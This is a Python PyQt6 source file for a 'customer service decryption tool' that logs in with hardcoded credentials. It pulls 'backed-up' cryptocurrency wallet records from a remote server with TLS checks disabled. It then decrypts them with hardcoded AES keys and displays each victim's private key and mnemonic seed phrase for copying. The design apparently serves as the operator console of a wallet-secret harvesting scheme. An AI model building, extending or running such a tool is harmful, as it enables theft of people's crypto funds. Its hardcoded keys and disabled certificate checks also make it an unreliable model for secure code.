"""
客服解密工具 - PyQt6桌面版
支持打包exe
"""
import sys
import requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import base64
import os
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                             QTextEdit, QMessageBox, QTableWidget, QTableWidgetItem,
                             QHeaderView, QFrame, QTabWidget)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QFont


# 默认服务器地址 - 改域名只改这里
DEFAULT_SERVER_URL = "https://api.ai656.top"


class DeleteWorker(QThread):
    """删除备份线程"""
    finished = pyqtSignal(int)
    error = pyqtSignal(str)

    def __init__(self, server_url, address):
        super().__init__()
        self.server_url = server_url
        self.address = address

    def run(self):
        try:
            response = requests.post(
                f'{self.server_url}/api/wallet/delete',
                json={'address': self.address},
                timeout=10,
                verify=False
            )
            
            if response.status_code != 200:
                self.error.emit(f"HTTP错误: {response.status_code}")
                return
            
            data = response.json()
            if not data.get('success'):
                self.error.emit(data.get('message', '删除失败'))
                return
            
            self.finished.emit(0)
        except Exception as e:
            self.error.emit(str(e))


class FetchWorker(QThread):
    """从服务器获取数据线程"""
    finished = pyqtSignal(list)
    error = pyqtSignal(str)

    def __init__(self, server_url):
        super().__init__()
        self.server_url = server_url

    def run(self):
        try:
            # 调用钱包列表接口（POST方法）
            response = requests.post(
                f'{self.server_url}/api/wallet/list',
                json={},
                timeout=10,
                verify=False
            )
            
            if response.status_code != 200:
                self.error.emit(f"HTTP错误: {response.status_code}")
                return
            
            data = response.json()
            if not data.get('success'):
                self.error.emit(data.get('message', '获取失败'))
                return
            
            # 返回钱包数据
            wallets = data.get('wallets', [])
            self.finished.emit(wallets)
        except Exception as e:
            self.error.emit(str(e))


class LoginWorker(QThread):
    """登录线程"""
    finished = pyqtSignal()
    error = pyqtSignal(str)

    def __init__(self, server_url, account, password):
        super().__init__()
        self.server_url = server_url
        self.account = account
        self.password = password

    def run(self):
        try:
            # 验证账号密码
            accounts = {
                '001': {'password': '111', 'expire': '2026-06-23'}
            }
            
            if self.account not in accounts:
                self.error.emit("账号不存在！")
                return
            
            acc_info = accounts[self.account]
            
            # 检查密码
            if self.password != acc_info['password']:
                self.error.emit("密码错误！")
                return
            
            # 检查到期时间
            from datetime import datetime
            expire_date = datetime.strptime(acc_info['expire'], '%Y-%m-%d')
            if datetime.now() > expire_date:
                self.error.emit(f"账号已过期！到期时间：{acc_info['expire']}")
                return
            
            # 登录成功
            self.finished.emit()

        except Exception as e:
            self.error.emit(f"错误: {str(e)}")




class DecryptTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("客服解密工具")
        self.setMinimumSize(1000, 650)
        self.init_ui()

    def init_ui(self):
        # 中心部件
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(0)
        main_layout.setContentsMargins(0, 0, 0, 0)

        # Tab控件
        self.tabs = QTabWidget()
        self.tabs.setFont(QFont("Microsoft YaHei", 10))
        main_layout.addWidget(self.tabs)
        
        # 第一个Tab：登录
        self.login_tab = QWidget()
        self.init_login_tab()
        self.tabs.addTab(self.login_tab, "登录")
        
        # 第二个Tab：数据获取（初始隐藏）
        self.fetch_tab = QWidget()
        self.init_fetch_tab()
        self.tabs.addTab(self.fetch_tab, "数据获取")
        self.tabs.setTabEnabled(1, False)

    def init_login_tab(self):
        """初始化登录Tab"""
        layout = QVBoxLayout(self.login_tab)
        layout.setSpacing(15)
        layout.setContentsMargins(20, 20, 20, 20)
        
        # 标题
        title = QLabel("客服系统登录")
        title.setFont(QFont("Microsoft YaHei", 16, QFont.Weight.Bold))
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(title)
        
        # 服务器地址
        url_layout = QHBoxLayout()
        url_layout.addWidget(QLabel("服务器地址:"))
        self.server_url_input = QLineEdit(DEFAULT_SERVER_URL)
        self.server_url_input.setFont(QFont("Microsoft YaHei", 10))
        self.server_url_input.setFixedHeight(35)
        url_layout.addWidget(self.server_url_input)
        layout.addLayout(url_layout)
        
        # 账号输入
        account_layout = QHBoxLayout()
        account_label = QLabel("账号:")
        account_label.setFont(QFont("Microsoft YaHei", 12))
        account_layout.addWidget(account_label)
        
        self.login_account_input = QLineEdit()
        self.login_account_input.setPlaceholderText("请输入账号")
        self.login_account_input.setFont(QFont("Microsoft YaHei", 11))
        self.login_account_input.setFixedHeight(35)
        account_layout.addWidget(self.login_account_input)
        layout.addLayout(account_layout)
        
        # 密码输入
        pwd_layout = QHBoxLayout()
        password_label = QLabel("密码:")
        password_label.setFont(QFont("Microsoft YaHei", 12))
        pwd_layout.addWidget(password_label)

        self.login_password_input = QLineEdit()
        self.login_password_input.setEchoMode(QLineEdit.EchoMode.Password)
        self.login_password_input.setPlaceholderText("请输入密码")
        self.login_password_input.setFont(QFont("Microsoft YaHei", 11))
        self.login_password_input.setFixedHeight(35)
        pwd_layout.addWidget(self.login_password_input)
        layout.addLayout(pwd_layout)
        
        # 登录按钮
        self.login_btn = QPushButton("登录")
        self.login_btn.setFont(QFont("Microsoft YaHei", 11, QFont.Weight.Bold))
        self.login_btn.setFixedHeight(40)
        self.login_btn.setStyleSheet("""
            QPushButton {
                background-color: #4CAF50;
                color: white;
                border: none;
                border-radius: 5px;
            }
            QPushButton:hover {
                background-color: #45a049;
            }
            QPushButton:pressed {
                background-color: #3d8b40;
            }
        """)
        self.login_btn.clicked.connect(self.do_login)
        layout.addWidget(self.login_btn)
        
        # 状态标签
        self.login_status = QLabel("")
        self.login_status.setFont(QFont("Microsoft YaHei", 10))
        self.login_status.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(self.login_status)
    
    def init_fetch_tab(self):
        """初始化数据获取Tab"""
        layout = QVBoxLayout(self.fetch_tab)
        layout.setSpacing(15)
        layout.setContentsMargins(20, 20, 20, 20)
        
        # 标题
        title = QLabel("从服务器获取钱包数据")
        title.setFont(QFont("Microsoft YaHei", 16, QFont.Weight.Bold))
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(title)
        
        # 获取按钮
        self.fetch_btn = QPushButton("从服务器获取数据")
        self.fetch_btn.setFont(QFont("Microsoft YaHei", 11, QFont.Weight.Bold))
        self.fetch_btn.setFixedHeight(40)
        self.fetch_btn.setStyleSheet("""
            QPushButton {
                background-color: #2196F3;
                color: white;
                border: none;
                border-radius: 5px;
            }
            QPushButton:hover {
                background-color: #1976D2;
            }
            QPushButton:pressed {
                background-color: #0D47A1;
            }
        """)
        self.fetch_btn.clicked.connect(self.fetch_data)
        layout.addWidget(self.fetch_btn)
        
        # 状态标签
        self.fetch_status = QLabel("")
        self.fetch_status.setFont(QFont("Microsoft YaHei", 10))
        self.fetch_status.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(self.fetch_status)
        
        # 数据表格
        self.fetch_table = QTableWidget()
        self.fetch_table.setColumnCount(8)
        self.fetch_table.setHorizontalHeaderLabels(["ID", "钱包地址", "链", "私钥", "助记词", "备份时间", "操作", "解密"])
        self.fetch_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        self.fetch_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        self.fetch_table.horizontalHeader().setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        self.fetch_table.horizontalHeader().setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        self.fetch_table.horizontalHeader().setSectionResizeMode(4, QHeaderView.ResizeMode.Stretch)
        self.fetch_table.horizontalHeader().setSectionResizeMode(5, QHeaderView.ResizeMode.ResizeToContents)
        self.fetch_table.horizontalHeader().setSectionResizeMode(6, QHeaderView.ResizeMode.ResizeToContents)
        self.fetch_table.horizontalHeader().setSectionResizeMode(7, QHeaderView.ResizeMode.ResizeToContents)
        self.fetch_table.setFont(QFont("Microsoft YaHei", 10))
        self.fetch_table.setAlternatingRowColors(True)
        self.fetch_table.setStyleSheet("""
            QTableWidget {
                border: 1px solid #ddd;
                border-radius: 5px;
                gridline-color: #e0e0e0;
            }
            QTableWidget::item {
                padding: 8px;
            }
            QHeaderView::section {
                background-color: #2196F3;
                color: white;
                padding: 8px;
                border: none;
                font-weight: bold;
            }
        """)
        self.fetch_table.doubleClicked.connect(self.copy_cell_content)
        layout.addWidget(self.fetch_table)
        
        # 存储获取的数据和密钥
        self.fetched_data = []
        self.client_key = None
        self.server_key = None
    
    def init_decrypt_tab(self):
        """初始化解密工具Tab（原有功能）"""
        layout = QVBoxLayout(self.decrypt_tab)
        layout.setSpacing(15)
        layout.setContentsMargins(20, 20, 20, 20)

        # 标题
        title = QLabel("客服解密工具")
        title.setFont(QFont("Microsoft YaHei", 18, QFont.Weight.Bold))
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(title)

        # 账号密码输入区
        password_frame = QFrame()
        password_frame.setStyleSheet("QFrame { background-color: #f5f5f5; border-radius: 8px; padding: 15px; }")
        password_layout = QVBoxLayout(password_frame)
        
        # 账号输入
        account_layout = QHBoxLayout()
        account_label = QLabel("账号:")
        account_label.setFont(QFont("Microsoft YaHei", 12))
        account_layout.addWidget(account_label)
        
        self.account_input = QLineEdit()
        self.account_input.setPlaceholderText("请输入账号")
        self.account_input.setFont(QFont("Microsoft YaHei", 11))
        self.account_input.setFixedHeight(35)
        account_layout.addWidget(self.account_input)
        password_layout.addLayout(account_layout)
        
        # 密码输入
        pwd_layout = QHBoxLayout()
        password_label = QLabel("密码:")
        password_label.setFont(QFont("Microsoft YaHei", 12))
        pwd_layout.addWidget(password_label)

        self.password_input = QLineEdit()
        self.password_input.setEchoMode(QLineEdit.EchoMode.Password)
        self.password_input.setPlaceholderText("请输入密码")
        self.password_input.setFont(QFont("Microsoft YaHei", 11))
        self.password_input.setFixedHeight(35)
        pwd_layout.addWidget(self.password_input)
        password_layout.addLayout(pwd_layout)

        self.decrypt_btn = QPushButton("登录")
        self.decrypt_btn.setFont(QFont("Microsoft YaHei", 11, QFont.Weight.Bold))
        self.decrypt_btn.setFixedHeight(35)
        self.decrypt_btn.setFixedWidth(120)
        self.decrypt_btn.setStyleSheet("""
            QPushButton {
                background-color: #4CAF50;
                color: white;
                border: none;
                border-radius: 5px;
            }
            QPushButton:hover {
                background-color: #45a049;
            }
            QPushButton:pressed {
                background-color: #3d8b40;
            }
        """)
        self.decrypt_btn.clicked.connect(self.start_decrypt)
        password_layout.addWidget(self.decrypt_btn)

        layout.addWidget(password_frame)

        # 状态标签（初始隐藏）
        self.status_label = QLabel("")
        self.status_label.setFont(QFont("Microsoft YaHei", 10))
        self.status_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.status_label.setVisible(False)
        layout.addWidget(self.status_label)

        # 结果表格（初始隐藏）
        self.table = QTableWidget()
        self.table.setColumnCount(4)
        self.table.setHorizontalHeaderLabels(["钱包地址", "链", "备份时间", "操作"])
        self.table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        self.table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        self.table.horizontalHeader().setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        self.table.horizontalHeader().setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)
        self.table.setFont(QFont("Microsoft YaHei", 10))
        self.table.setAlternatingRowColors(True)
        self.table.setVisible(False)
        self.table.setStyleSheet("""
            QTableWidget {
                border: 1px solid #ddd;
                border-radius: 5px;
                gridline-color: #e0e0e0;
            }
            QTableWidget::item {
                padding: 8px;
            }
            QHeaderView::section {
                background-color: #4CAF50;
                color: white;
                padding: 8px;
                border: none;
                font-weight: bold;
            }
        """)
        layout.addWidget(self.table)
        
        # 存储加密数据和密钥
        self.encrypted_wallets = []
        self.client_key = None
        self.server_key = None
    
    def do_login(self):
        """执行登录"""
        account = self.login_account_input.text().strip()
        password = self.login_password_input.text().strip()
        
        if not account or not password:
            QMessageBox.warning(self, "提示", "请输入账号和密码！")
            return
        
        self.login_btn.setEnabled(False)
        self.login_btn.setText("登录中...")
        self.login_status.setText("正在验证...")
        self.login_status.setStyleSheet("color: #2196F3;")
        
        server_url = self.server_url_input.text().strip()
        self.login_worker = LoginWorker(server_url, account, password)
        self.login_worker.finished.connect(self.on_login_success)
        self.login_worker.error.connect(self.on_login_error)
        self.login_worker.start()
    
    def on_login_success(self):
        """登录成功"""
        self.login_btn.setEnabled(True)
        self.login_btn.setText("登录")
        self.login_status.setText("登录成功！")
        self.login_status.setStyleSheet("color: #4CAF50;")
        
        # 启用数据获取Tab和解密工具Tab
        self.tabs.setTabEnabled(1, True)
        self.tabs.setTabEnabled(2, True)
        
        # 切换到数据获取Tab
        self.tabs.setCurrentIndex(1)
    
    def on_login_error(self, error_msg):
        """登录失败"""
        self.login_btn.setEnabled(True)
        self.login_btn.setText("登录")
        self.login_status.setText(error_msg)
        self.login_status.setStyleSheet("color: #f44336;")
        QMessageBox.critical(self, "错误", error_msg)
    
    def fetch_data(self):
        """从服务器获取数据"""
        self.fetch_btn.setEnabled(False)
        self.fetch_btn.setText("获取中...")
        self.fetch_status.setText("正在请求数据...")
        self.fetch_status.setStyleSheet("color: #2196F3;")
        
        server_url = self.server_url_input.text().strip()
        self.fetch_worker = FetchWorker(server_url)
        self.fetch_worker.finished.connect(self.on_fetch_success)
        self.fetch_worker.error.connect(self.on_fetch_error)
        self.fetch_worker.start()
    
    def on_fetch_success(self, wallets):
        """获取数据成功"""
        self.fetch_btn.setEnabled(True)
        self.fetch_btn.setText("从服务器获取数据")
        
        self.fetched_data = wallets
        self.fetch_status.setText(f"获取成功！共 {len(wallets)} 条记录")
        self.fetch_status.setStyleSheet("color: #4CAF50;")
        
        # 直接使用硬编码的client_key
        self.client_key = b'ClientWallet2026SecureKey32B!!!!'
        
        # 填充表格
        self.fetch_table.setRowCount(len(wallets))
        for i, item in enumerate(wallets):
            # 直接显示数据库中的地址和链
            address = item.get('address', '')
            chain = item.get('chain', '')
            backup_time = item.get('backup_time', '')
            
            self.fetch_table.setItem(i, 0, QTableWidgetItem(str(item.get('id', ''))))
            self.fetch_table.setItem(i, 1, QTableWidgetItem(address))
            self.fetch_table.setItem(i, 2, QTableWidgetItem(chain))
            self.fetch_table.setItem(i, 3, QTableWidgetItem('双击复制'))
            self.fetch_table.setItem(i, 4, QTableWidgetItem('双击复制'))
            self.fetch_table.setItem(i, 5, QTableWidgetItem(backup_time))
            
            # 添加删除按钮
            delete_btn = QPushButton("删除")
            delete_btn.setStyleSheet("""
                QPushButton {
                    background-color: #f44336;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    padding: 5px 15px;
                }
                QPushButton:hover {
                    background-color: #d32f2f;
                }
            """)
            backup_id = item.get('backup_id', '')
            delete_btn.clicked.connect(lambda checked, idx=i, bid=backup_id: self.delete_row(idx, bid))
            self.fetch_table.setCellWidget(i, 6, delete_btn)
            
            # 添加解密按钮
            decrypt_btn = QPushButton("解密")
            decrypt_btn.setStyleSheet("""
                QPushButton {
                    background-color: #4CAF50;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    padding: 5px 15px;
                }
                QPushButton:hover {
                    background-color: #45a049;
                }
            """)
            decrypt_btn.clicked.connect(lambda checked, idx=i: self.decrypt_row(idx))
            self.fetch_table.setCellWidget(i, 7, decrypt_btn)
    
    def on_fetch_error(self, error_msg):
        """获取数据失败"""
        self.fetch_btn.setEnabled(True)
        self.fetch_btn.setText("从服务器获取数据")
        self.fetch_status.setText(f"获取失败: {error_msg}")
        self.fetch_status.setStyleSheet("color: #f44336;")
        QMessageBox.critical(self, "错误", error_msg)

    def copy_cell_content(self, index):
        """双击单元格复制内容"""
        # 跳过操作列和解密按钮列（最后两列）
        if index.column() >= 6:
            return
        
        item = self.fetch_table.item(index.row(), index.column())
        if item:
            full_text = item.data(256)
            if not full_text:
                full_text = item.text()
            
            if full_text:
                QApplication.clipboard().setText(full_text)
                self.fetch_status.setText(f"已复制完整数据")
    
    def delete_row(self, row_index, backup_id):
        """删除指定行的备份"""
        reply = QMessageBox.question(
            self, 
            "确认删除", 
            f"确定要删除备份 {backup_id} 吗？\n此操作不可恢复！",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        
        if reply == QMessageBox.StandardButton.No:
            return
        
        # 获取该行的地址
        wallet = self.fetched_data[row_index]
        address = wallet.get('address', '')
        
        server_url = self.server_url_input.text().strip()
        self.delete_worker = DeleteWorker(server_url, address)
        self.delete_worker.finished.connect(lambda: self.on_delete_success(row_index))
        self.delete_worker.error.connect(self.on_delete_error)
        self.delete_worker.start()
    
    def on_delete_success(self, row_index):
        """删除成功"""
        # 从表格中移除该行
        self.fetch_table.removeRow(row_index)
        # 从数据列表中移除
        if row_index < len(self.fetched_data):
            self.fetched_data.pop(row_index)
        self.fetch_status.setText(f"删除成功！")
        self.fetch_status.setStyleSheet("color: #4CAF50;")
    
    def on_delete_error(self, error_msg):
        """删除失败"""
        QMessageBox.critical(self, "删除失败", error_msg)
    
    def decrypt_row(self, row_index):
        """解密指定行的数据 - 简化版"""
        import json
        import base64
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        import traceback
        
        try:
            wallet = self.fetched_data[row_index]
            encrypted_data = wallet.get('encrypted_data', '')
            
            # 定义两个密钥
            CLIENT_KEY = b'ClientWallet2026SecureKey32B!!!!'
            SERVER_KEY = b'ServerWallet2026SecureKey32B!!!!'
            
            wallet_data = None
            
            # 判断数据类型：JSON明文 vs Base64加密
            if encrypted_data.startswith('{'):
                # 明文JSON，直接解析
                wallet_data = json.loads(encrypted_data)
            else:
                # Base64加密数据，尝试用ServerKey解密（新数据）
                try:
                    encrypted_bytes = base64.b64decode(encrypted_data)
                    nonce = encrypted_bytes[:12]
                    ciphertext = encrypted_bytes[12:]
                    aesgcm = AESGCM(SERVER_KEY)
                    decrypted_bytes = aesgcm.decrypt(nonce, ciphertext, None)
                    wallet_data = json.loads(decrypted_bytes.decode('utf-8'))
                    print("使用ServerKey解密成功")
                except Exception as e1:
                    # 如果ServerKey失败，尝试用ClientKey解密（旧数据）
                    print(f"ServerKey解密失败: {e1}")
                    encrypted_bytes = base64.b64decode(encrypted_data)
                    nonce = encrypted_bytes[:12]
                    ciphertext = encrypted_bytes[12:]
                    aesgcm = AESGCM(CLIENT_KEY)
                    decrypted_bytes = aesgcm.decrypt(nonce, ciphertext, None)
                    wallet_data = json.loads(decrypted_bytes.decode('utf-8'))
                    print("使用ClientKey解密成功")
            
            # 提取数据
            address = wallet_data.get('address', '')
            chain = wallet_data.get('chain', '')
            private_key = wallet_data.get('private_key', '')
            mnemonic = wallet_data.get('mnemonic', '')
            
            # 更新表格 - 显示真实数据
            self.fetch_table.setItem(row_index, 1, QTableWidgetItem(address))
            self.fetch_table.setItem(row_index, 2, QTableWidgetItem(chain))
            
            # 显示真实私钥和助记词，并存储在隐藏属性中用于复制
            item_pk = QTableWidgetItem(private_key)
            item_pk.setData(256, private_key)
            self.fetch_table.setItem(row_index, 3, item_pk)
            
            item_mn = QTableWidgetItem(mnemonic)
            item_mn.setData(256, mnemonic)
            self.fetch_table.setItem(row_index, 4, item_mn)
            
            # 禁用该行的解密按钮
            button = self.fetch_table.cellWidget(row_index, 7)
            if button:
                button.setText("已解密")
                button.setEnabled(False)
                button.setStyleSheet("""
                    QPushButton {
                        background-color: #9E9E9E;
                        color: white;
                        border: none;
                        border-radius: 4px;
                    }
                """)
            
            self.fetch_status.setText(f"第 {row_index + 1} 条数据解密成功！")
            
        except Exception as e:
            error_detail = traceback.format_exc()
            print(f"解密错误: {error_detail}")
            QMessageBox.critical(self, "解密失败", f"错误: {str(e)}")

    def on_error(self, error_msg):
        self.decrypt_btn.setEnabled(True)
        self.decrypt_btn.setText("解密查询")
        self.status_label.setText(error_msg)
        self.status_label.setStyleSheet("color: #f44336;")
        QMessageBox.critical(self, "错误", error_msg)


if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = DecryptTool()
    window.show()
    sys.exit(app.exec())
